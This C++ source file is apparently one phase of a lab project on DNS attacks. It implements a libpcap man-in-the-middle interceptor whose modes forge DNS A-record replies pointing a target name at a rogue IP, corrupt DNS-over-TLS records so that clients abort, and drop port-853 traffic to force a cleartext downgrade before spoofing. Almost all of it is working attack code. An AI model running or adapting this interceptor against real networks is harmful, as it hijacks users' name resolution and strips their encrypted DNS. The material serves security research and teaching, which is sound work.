// Phase 7 — DNS-over-TLS (DoT) last-mile interceptor
//
// Extends the Phase 6 UDP interceptor with a TCP/TLS tamper mode for
// demonstrating Attack (i): post-handshake TLS record corruption.
//
// Modes:
//   --relay        (default) Relay UDP DNS responses from resolver to client
//                  transparently.  No modification.
//   --forge        Relay UDP DNS responses but replace the answer for
//                  --target with a forged A record pointing to --ip.
//   --tamper-tls   Relay TCP port-853 (DoT) segments from resolver to client.
//                  After seeing TAMPER_AFTER_RECORDS TLS type-0x17 records on
//                  the same connection, flip one byte in the TLS record body
//                  so that the AEAD tag no longer verifies and the client
//                  aborts with a "bad_record_mac" fatal alert.
//
// Only one mode is active at a time; the last flag wins.
//
// Build:  g++ -O2 -Wall -Wextra -std=c++17 -o interceptor interceptor.cpp -lpcap
//
// Usage:
//   interceptor [--relay|--forge|--tamper-tls]
//               [--client-mac MAC] [--iface IFACE]
//               [--target NAME] [--ip ADDRESS]

#define _DEFAULT_SOURCE 1

#include <algorithm>
#include <arpa/inet.h>
#include <cctype>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <iostream>
#include <map>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <sstream>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

// ── constants ─────────────────────────────────────────────────────────────────

// After this many TLS type-0x17 records on a connection, start corrupting.
// Typical TLS 1.3 DoT handshake uses 2–3 encrypted records before the DNS
// query/response exchange, so we start corrupting at the 4th record.
static constexpr int TAMPER_AFTER_RECORDS = 3;

// TLS content type for Application Data (also used for encrypted handshake
// records in TLS 1.3, but the DNS payload arrives after the handshake).
static constexpr uint8_t TLS_APPLICATION_DATA = 0x17;

// ── structs ───────────────────────────────────────────────────────────────────

struct DnsHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// Minimum TLS record header: type(1) + version(2) + length(2)
static constexpr size_t TLS_RECORD_HDR = 5;

enum class Mode { RELAY, FORGE, TAMPER_TLS, DENY };

struct Config {
    std::string iface        = "eth0";
    std::string client_ip    = "172.16.1.10";
    std::string resolver_ip  = "172.16.2.10";
    std::string target       = "example.com";
    std::string rogue_ip     = "172.16.1.30";
    Mode        mode         = Mode::RELAY;
    uint8_t     attacker_mac[6]{};
    uint8_t     client_mac[6]{};
    bool        have_client_mac = false;
};

static Config  config;
static pcap_t *capture = nullptr;



// ── helpers ───────────────────────────────────────────────────────────────────

static uint16_t read_u16(const uint8_t *data) {
    uint16_t v;
    std::memcpy(&v, data, 2);
    return ntohs(v);
}

static uint16_t internet_checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;
    size_t i = 0;
    while (i + 1 < len) {
        sum += static_cast<uint16_t>((data[i] << 8) | data[i + 1]);
        i += 2;
    }
    if (i < len)
        sum += static_cast<uint16_t>(data[i] << 8);
    while (sum >> 16)
        sum = (sum & 0xffffU) + (sum >> 16);
    return htons(static_cast<uint16_t>(~sum));
}

static uint16_t udp_checksum(const iphdr *ip, const udphdr *udp,
                              const uint8_t *payload, size_t payload_len) {
    const size_t udp_len = sizeof(udphdr) + payload_len;
    std::vector<uint8_t> buf(12 + udp_len, 0);
    std::memcpy(buf.data(),     &ip->saddr, 4);
    std::memcpy(buf.data() + 4, &ip->daddr, 4);
    buf[9] = IPPROTO_UDP;
    std::memcpy(buf.data() + 10, &udp->len, 2);
    std::memcpy(buf.data() + 12, udp, sizeof(udphdr));
    std::memset(buf.data() + 12 + offsetof(udphdr, check), 0, 2);
    std::memcpy(buf.data() + 12 + sizeof(udphdr), payload, payload_len);
    uint16_t r = internet_checksum(buf.data(), buf.size());
    return r == 0 ? htons(0xffff) : r;
}

static uint16_t tcp_checksum(const iphdr *ip, const tcphdr *tcp,
                              size_t tcp_total_len) {
    std::vector<uint8_t> buf(12 + tcp_total_len, 0);
    std::memcpy(buf.data(),     &ip->saddr, 4);
    std::memcpy(buf.data() + 4, &ip->daddr, 4);
    buf[9] = IPPROTO_TCP;
    const uint16_t len_n = htons(static_cast<uint16_t>(tcp_total_len));
    std::memcpy(buf.data() + 10, &len_n, 2);
    std::memcpy(buf.data() + 12, tcp, tcp_total_len);
    // Zero the checksum field inside the copy
    std::memset(buf.data() + 12 + offsetof(tcphdr, check), 0, 2);
    uint16_t r = internet_checksum(buf.data(), buf.size());
    return r == 0 ? htons(0xffff) : r;
}

static bool interface_mac(const std::string &name, uint8_t mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    ifreq req{};
    std::strncpy(req.ifr_name, name.c_str(), IFNAMSIZ - 1);
    const bool ok = ioctl(fd, SIOCGIFHWADDR, &req) == 0;
    close(fd);
    if (ok) std::memcpy(mac, req.ifr_hwaddr.sa_data, 6);
    return ok;
}

static bool parse_mac(const std::string &text, uint8_t mac[6]) {
    unsigned int v[6];
    if (std::sscanf(text.c_str(), "%x:%x:%x:%x:%x:%x",
                    &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return false;
    for (size_t i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(v[i]);
    return true;
}

static bool arp_cache_mac(const std::string &address, uint8_t mac[6]) {
    std::ifstream in("/proc/net/arp");
    std::string line;
    std::getline(in, line);
    while (std::getline(in, line)) {
        std::istringstream ss(line);
        std::string ip, type, flags, hw, mask, dev;
        if (ss >> ip >> type >> flags >> hw >> mask >> dev) {
            if (ip == address && hw != "00:00:00:00:00:00")
                return parse_mac(hw, mac);
        }
    }
    return false;
}

static bool resolve_client_mac() {
    for (int attempt = 0; attempt < 5; ++attempt) {
        if (arp_cache_mac(config.client_ip, config.client_mac)) return true;
        std::string ping   = "ping -c 1 -W 1 " + config.client_ip + " >/dev/null 2>&1";
        std::string arping = "arping -c 1 -w 1 -I " + config.iface + " " +
                             config.client_ip + " >/dev/null 2>&1";
        (void)std::system(ping.c_str());
        (void)std::system(arping.c_str());
        usleep(100000);
    }
    return false;
}

// ── DNS name parsing ──────────────────────────────────────────────────────────

static std::string dns_question_name(const uint8_t *dns, size_t dns_len,
                                     size_t offset, size_t &bytes_read) {
    std::string name;
    size_t cur = offset;
    bytes_read = 0;
    while (cur < dns_len) {
        const uint8_t llen = dns[cur++];
        if (llen == 0) { bytes_read = cur - offset; break; }
        if ((llen & 0xc0) != 0 || cur + llen > dns_len) { bytes_read = 0; return {}; }
        if (!name.empty()) name += '.';
        name.append(reinterpret_cast<const char *>(dns + cur), llen);
        cur += llen;
    }
    std::transform(name.begin(), name.end(), name.begin(),
                   [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
    return name;
}

// ── packet layout helpers ─────────────────────────────────────────────────────

static bool udp_layout(const pcap_pkthdr *hdr, const uint8_t *pkt,
                       const iphdr *&ip, const udphdr *&udp,
                       const uint8_t *&dns, size_t &dns_len) {
    if (hdr->caplen < sizeof(ether_header) + sizeof(iphdr)) return false;
    const auto *eth = reinterpret_cast<const ether_header *>(pkt);
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return false;
    ip = reinterpret_cast<const iphdr *>(pkt + sizeof(ether_header));
    const size_t ihl = ip->ihl * 4U;
    if (ip->version != 4 || ihl < sizeof(iphdr) || ip->protocol != IPPROTO_UDP) return false;
    const size_t udp_off = sizeof(ether_header) + ihl;
    if (hdr->caplen < udp_off + sizeof(udphdr)) return false;
    udp = reinterpret_cast<const udphdr *>(pkt + udp_off);
    const size_t udp_len = ntohs(udp->len);
    if (udp_len < sizeof(udphdr) || hdr->caplen < udp_off + udp_len) return false;
    dns = pkt + udp_off + sizeof(udphdr);
    dns_len = udp_len - sizeof(udphdr);
    return dns_len >= sizeof(DnsHeader);
}

// Returns true and fills ip/tcp/payload* for a TCP segment captured in pkt.
static bool tcp_layout(const pcap_pkthdr *hdr, const uint8_t *pkt,
                        const iphdr *&ip, const tcphdr *&tcp,
                        const uint8_t *&payload, size_t &payload_len) {
    if (hdr->caplen < sizeof(ether_header) + sizeof(iphdr)) return false;
    const auto *eth = reinterpret_cast<const ether_header *>(pkt);
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return false;
    ip = reinterpret_cast<const iphdr *>(pkt + sizeof(ether_header));
    const size_t ihl = ip->ihl * 4U;
    if (ip->version != 4 || ihl < sizeof(iphdr) || ip->protocol != IPPROTO_TCP) return false;
    const size_t tcp_off = sizeof(ether_header) + ihl;
    if (hdr->caplen < tcp_off + sizeof(tcphdr)) return false;
    tcp = reinterpret_cast<const tcphdr *>(pkt + tcp_off);
    const size_t tcp_hdr_len = tcp->doff * 4U;
    if (tcp_hdr_len < sizeof(tcphdr)) return false;
    const size_t pay_off = tcp_off + tcp_hdr_len;
    if (hdr->caplen < pay_off) return false;
    payload     = pkt + pay_off;
    payload_len = hdr->caplen - pay_off;
    return true;
}

// ── relay helpers ─────────────────────────────────────────────────────────────

// Relay a UDP packet to the client (MAC rewrite + recalculate checksums).
static void relay_udp(const uint8_t *pkt, size_t pkt_len) {
    std::vector<uint8_t> frame(pkt, pkt + pkt_len);
    auto *eth = reinterpret_cast<ether_header *>(frame.data());
    std::memcpy(eth->ether_dhost, config.client_mac,    6);
    std::memcpy(eth->ether_shost, config.attacker_mac,  6);

    auto *ip  = reinterpret_cast<iphdr *>(frame.data() + sizeof(ether_header));
    const size_t ihl = ip->ihl * 4U;
    auto *udp = reinterpret_cast<udphdr *>(frame.data() + sizeof(ether_header) + ihl);
    uint8_t *payload     = reinterpret_cast<uint8_t *>(udp) + sizeof(udphdr);
    const size_t pay_len = ntohs(udp->len) - sizeof(udphdr);

    ip->check  = 0;
    ip->check  = internet_checksum(reinterpret_cast<uint8_t *>(ip), ihl);
    udp->check = 0;
    udp->check = udp_checksum(ip, udp, payload, pay_len);

    if (pcap_inject(capture, frame.data(), frame.size()) < 0)
        std::cerr << "[-] UDP relay injection failed: " << pcap_geterr(capture) << '\n';
}

// Relay a TCP segment to the client (MAC rewrite + recalculate checksums).
// Optionally corrupt one byte in the TLS record body for the tamper attack.
static void relay_tcp(const uint8_t *pkt, size_t pkt_len, bool corrupt) {
    std::vector<uint8_t> frame(pkt, pkt + pkt_len);
    auto *eth = reinterpret_cast<ether_header *>(frame.data());
    std::memcpy(eth->ether_dhost, config.client_mac,    6);
    std::memcpy(eth->ether_shost, config.attacker_mac,  6);

    auto *ip = reinterpret_cast<iphdr *>(frame.data() + sizeof(ether_header));
    const size_t ihl = ip->ihl * 4U;
    auto *tcp = reinterpret_cast<tcphdr *>(frame.data() + sizeof(ether_header) + ihl);
    const size_t tcp_hdr_len  = tcp->doff * 4U;
    const size_t tcp_total    = ntohs(ip->tot_len) - ihl;

    if (corrupt) {
        // Locate the TLS Application Data record within the TCP payload.
        // The payload starts immediately after the TCP header.
        uint8_t *pay = reinterpret_cast<uint8_t *>(tcp) + tcp_hdr_len;
        const size_t pay_len = tcp_total - tcp_hdr_len;

        // Walk TLS records in the payload and flip a byte in the first
        // type-0x17 record body we find (at offset TLS_RECORD_HDR+4 into that
        // record, i.e. the 5th byte of the ciphertext/MAC region).
        size_t pos = 0;
        bool done  = false;
        while (!done && pos + TLS_RECORD_HDR <= pay_len) {
            const uint8_t  rec_type = pay[pos];
            const uint16_t rec_len  = static_cast<uint16_t>(
                (pay[pos + 3] << 8) | pay[pos + 4]);

            if (rec_type == TLS_APPLICATION_DATA && rec_len > 4 &&
                pos + TLS_RECORD_HDR + rec_len <= pay_len) {
                // Flip one byte deep inside the AEAD ciphertext.
                pay[pos + TLS_RECORD_HDR + 4] ^= 0xAA;
                std::cout << "[!] Tampered: flipped byte in TLS record at payload+"
                          << (pos + TLS_RECORD_HDR + 4) << " (record body len="
                          << rec_len << ")\n";
                done = true;
            }
            pos += TLS_RECORD_HDR + rec_len;
        }
        if (!done) {
            std::cout << "[~] No suitable TLS 0x17 record found in this segment"
                         " — relaying unmodified.\n";
        }
    }

    ip->check  = 0;
    ip->check  = internet_checksum(reinterpret_cast<uint8_t *>(ip), ihl);
    tcp->check = 0;
    tcp->check = tcp_checksum(ip, tcp, tcp_total);

    if (pcap_inject(capture, frame.data(), frame.size()) < 0)
        std::cerr << "[-] TCP relay injection failed: " << pcap_geterr(capture) << '\n';
}

// ── forge (UDP DNS) ───────────────────────────────────────────────────────────

static void forge_response(const iphdr *orig_ip, const udphdr *orig_udp,
                           const uint8_t *orig_dns, size_t orig_dns_len,
                           size_t qname_len) {
    const size_t question_len = qname_len + 4;
    if (sizeof(DnsHeader) + question_len > orig_dns_len) return;

    const size_t answer_len = 16;
    const size_t dns_len    = sizeof(DnsHeader) + question_len + answer_len;
    std::vector<uint8_t> dns(dns_len, 0);

    const auto *old_hdr = reinterpret_cast<const DnsHeader *>(orig_dns);
    auto       *new_hdr = reinterpret_cast<DnsHeader *>(dns.data());
    new_hdr->id      = old_hdr->id;
    const uint16_t old_flags = ntohs(old_hdr->flags);
    const uint16_t preserved = old_flags & (0x0100U | 0x0010U); // RD, CD
    new_hdr->flags   = htons(static_cast<uint16_t>(0x8000U | 0x0080U | 0x0020U | preserved));
    new_hdr->qdcount = htons(1);
    new_hdr->ancount = htons(1);

    std::memcpy(dns.data() + sizeof(DnsHeader),
                orig_dns + sizeof(DnsHeader), question_len);

    uint8_t *ans = dns.data() + sizeof(DnsHeader) + question_len;
    ans[0] = 0xc0; ans[1] = 0x0c;          // name compression
    ans[2] = 0x00; ans[3] = 0x01;          // type A
    ans[4] = 0x00; ans[5] = 0x01;          // class IN
    ans[6] = 0x00; ans[7] = 0x00; ans[8] = 0x02; ans[9] = 0x58; // TTL 600
    ans[10] = 0x00; ans[11] = 0x04;        // rdlength 4
    in_addr rogue{};
    inet_pton(AF_INET, config.rogue_ip.c_str(), &rogue);
    std::memcpy(ans + 12, &rogue.s_addr, 4);

    const size_t frame_len = sizeof(ether_header) + sizeof(iphdr) + sizeof(udphdr) + dns_len;
    std::vector<uint8_t> frame(frame_len, 0);

    auto *eth = reinterpret_cast<ether_header *>(frame.data());
    std::memcpy(eth->ether_dhost, config.client_mac,   6);
    std::memcpy(eth->ether_shost, config.attacker_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    auto *ip = reinterpret_cast<iphdr *>(frame.data() + sizeof(ether_header));
    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = orig_ip->tos;
    ip->tot_len  = htons(sizeof(iphdr) + sizeof(udphdr) + dns_len);
    ip->id       = orig_ip->id;
    ip->ttl      = orig_ip->ttl;
    ip->protocol = IPPROTO_UDP;
    ip->saddr    = orig_ip->saddr;
    ip->daddr    = orig_ip->daddr;
    ip->check    = internet_checksum(reinterpret_cast<uint8_t *>(ip), sizeof(iphdr));

    auto *udp = reinterpret_cast<udphdr *>(frame.data() + sizeof(ether_header) + sizeof(iphdr));
    udp->source = orig_udp->source;
    udp->dest   = orig_udp->dest;
    udp->len    = htons(sizeof(udphdr) + dns_len);

    uint8_t *payload = reinterpret_cast<uint8_t *>(udp) + sizeof(udphdr);
    std::memcpy(payload, dns.data(), dns_len);
    udp->check = udp_checksum(ip, udp, payload, dns_len);

    if (pcap_inject(capture, frame.data(), frame.size()) < 0) {
        std::cerr << "[-] Forge injection failed: " << pcap_geterr(capture) << '\n';
        return;
    }
    std::cout << "[+] Forged last-mile reply: " << config.target << " -> "
              << config.rogue_ip << ", AD=1, TXID=0x" << std::hex
              << ntohs(new_hdr->id) << std::dec << '\n';
}

// ── packet handlers ───────────────────────────────────────────────────────────

// Handler for UDP mode (relay / forge).
static void handle_udp_packet(u_char *, const pcap_pkthdr *hdr, const u_char *pkt) {
    const iphdr  *ip  = nullptr;
    const udphdr *udp = nullptr;
    const uint8_t *dns = nullptr;
    size_t dns_len = 0;
    if (!udp_layout(hdr, pkt, ip, udp, dns, dns_len)) return;

    const auto *dns_hdr = reinterpret_cast<const DnsHeader *>(dns);
    size_t qname_len = 0;
    const std::string qname = dns_question_name(dns, dns_len, sizeof(DnsHeader), qname_len);
    if (qname_len == 0 || sizeof(DnsHeader) + qname_len + 4 > dns_len) {
        relay_udp(pkt, hdr->caplen);
        return;
    }

    const uint16_t qtype  = read_u16(dns + sizeof(DnsHeader) + qname_len);
    const bool     target = (config.mode == Mode::FORGE || config.mode == Mode::DENY) &&
                            qname == config.target && qtype == 1 &&
                            ntohs(dns_hdr->ancount) > 0;
    if (target)
        forge_response(ip, udp, dns, dns_len, qname_len);
    else
        relay_udp(pkt, hdr->caplen);
}

// Handler for DENY mode (Attempt iii: drop TCP 853 to force cleartext fallback,
// then forge cleartext UDP 53 responses).
static void handle_deny_packet(u_char *user, const pcap_pkthdr *hdr, const u_char *pkt) {
    if (hdr->caplen < sizeof(ether_header) + sizeof(iphdr)) return;
    const auto *ip = reinterpret_cast<const iphdr *>(pkt + sizeof(ether_header));
    if (ip->protocol == IPPROTO_TCP) {
        // Drop TCP 853 segment to deny DoT transport
        std::cout << "[!] Denied TCP 853 segment from resolver to client (transport denial)\n";
        return;
    } else if (ip->protocol == IPPROTO_UDP) {
        // Client fell back to cleartext UDP 53; forge response
        handle_udp_packet(user, hdr, pkt);
    }
}

// Track per-connection handshake and tamper state.
static std::map<uint16_t, bool> conn_handshake_done;
static std::map<uint16_t, bool> conn_tampered;

// Handler for TCP/TLS tamper mode.
static void handle_tcp_packet(u_char *, const pcap_pkthdr *hdr, const u_char *pkt) {
    const iphdr  *ip  = nullptr;
    const tcphdr *tcp = nullptr;
    const uint8_t *payload = nullptr;
    size_t pay_len = 0;
    if (!tcp_layout(hdr, pkt, ip, tcp, payload, pay_len)) return;

    // Key: client's ephemeral port (= dport in resolver->client segments).
    const uint16_t conn_key = tcp->dest;

    bool should_corrupt = false;
    if (pay_len >= TLS_RECORD_HDR) {
        // Handshake flight from server begins with Handshake record (0x16 ServerHello)
        if (payload[0] == 0x16) {
            conn_handshake_done[conn_key] = true;
        } else if (conn_handshake_done[conn_key] && !conn_tampered[conn_key] &&
                   payload[0] == TLS_APPLICATION_DATA) {
            // This is post-handshake application data (the encrypted DNS response)
            should_corrupt = true;
            conn_tampered[conn_key] = true;
        }
    }

    // Clean up finished connections (FIN or RST).
    if (tcp->fin || tcp->rst) {
        conn_handshake_done.erase(conn_key);
        conn_tampered.erase(conn_key);
    }

    relay_tcp(pkt, hdr->caplen, should_corrupt);
}

// ── main ──────────────────────────────────────────────────────────────────────

int main(int argc, char **argv) {
    for (int i = 1; i < argc; ++i) {
        const std::string arg = argv[i];
        if      (arg == "--forge")       config.mode = Mode::FORGE;
        else if (arg == "--relay")       config.mode = Mode::RELAY;
        else if (arg == "--tamper-tls")  config.mode = Mode::TAMPER_TLS;
        else if (arg == "--deny")        config.mode = Mode::DENY;
        else if (arg == "--iface"      && i + 1 < argc) config.iface      = argv[++i];
        else if (arg == "--target"     && i + 1 < argc) config.target     = argv[++i];
        else if (arg == "--ip"         && i + 1 < argc) config.rogue_ip   = argv[++i];
        else if (arg == "--client-mac" && i + 1 < argc) {
            config.have_client_mac = parse_mac(argv[++i], config.client_mac);
        } else {
            std::cerr << "Usage: interceptor [--relay|--forge|--tamper-tls|--deny] "
                         "[--client-mac MAC] [--iface IFACE] "
                         "[--target NAME] [--ip ADDRESS]\n";
            return 2;
        }
    }

    std::cout.setf(std::ios::unitbuf);

    const char *mode_name =
        config.mode == Mode::FORGE      ? "FORGE (UDP DNS)" :
        config.mode == Mode::TAMPER_TLS ? "TAMPER-TLS (TCP 853)" :
        config.mode == Mode::DENY       ? "DENY-AND-DOWNGRADE (Block TCP 853, Forge UDP 53)" :
                                          "TRANSPARENT RELAY (UDP DNS)";

    std::cout << "=== Phase 7 last-mile interceptor ===\n"
              << "Mode  : " << mode_name << '\n'
              << "Path  : resolver " << config.resolver_ip
              << " -> client "       << config.client_ip << '\n';

    if (!interface_mac(config.iface, config.attacker_mac)) {
        std::cerr << "[-] Could not read the attacker interface MAC.\n";
        return 1;
    }
    if (!config.have_client_mac && !resolve_client_mac()) {
        std::cerr << "[-] Could not resolve the client MAC.\n";
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    capture = pcap_open_live(config.iface.c_str(), 65535, 1, 1, errbuf);
    if (!capture) {
        std::cerr << "[-] pcap_open_live failed: " << errbuf << '\n';
        return 1;
    }
    if (pcap_setdirection(capture, PCAP_D_IN) == -1) {
        std::cerr << "[-] pcap_setdirection failed: " << pcap_geterr(capture) << '\n';
        return 1;
    }

    std::string filter;
    pcap_handler handler;

    if (config.mode == Mode::TAMPER_TLS) {
        // Capture only TCP port-853 segments from resolver to client.
        filter  = "tcp and src host " + config.resolver_ip +
                  " and src port 853 and dst host " + config.client_ip;
        handler = handle_tcp_packet;
    } else if (config.mode == Mode::DENY) {
        // Capture both TCP 853 (to drop) and UDP 53 (to forge)
        filter  = "src host " + config.resolver_ip + " and dst host " + config.client_ip +
                  " and ((tcp and src port 853) or (udp and src port 53))";
        handler = handle_deny_packet;
        std::cout << "Deny: dropping TCP 853 to force cleartext fallback; forging UDP 53 for "
                  << config.target << " -> " << config.rogue_ip << '\n';
    } else {
        // UDP DNS relay / forge — same as Phase 6.
        filter  = "udp and src host " + config.resolver_ip +
                  " and src port 53 and dst host " + config.client_ip;
        handler = handle_udp_packet;
    }

    bpf_program prog{};
    if (pcap_compile(capture, &prog, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) == -1 ||
        pcap_setfilter(capture, &prog) == -1) {
        std::cerr << "[-] Could not install capture filter: " << pcap_geterr(capture) << '\n';
        pcap_close(capture);
        return 1;
    }
    pcap_freecode(&prog);

    std::cout << "[+] Ready on " << config.iface << "; filter: " << filter << '\n';
    pcap_loop(capture, -1, handler, nullptr);
    pcap_close(capture);
    return 0;
}
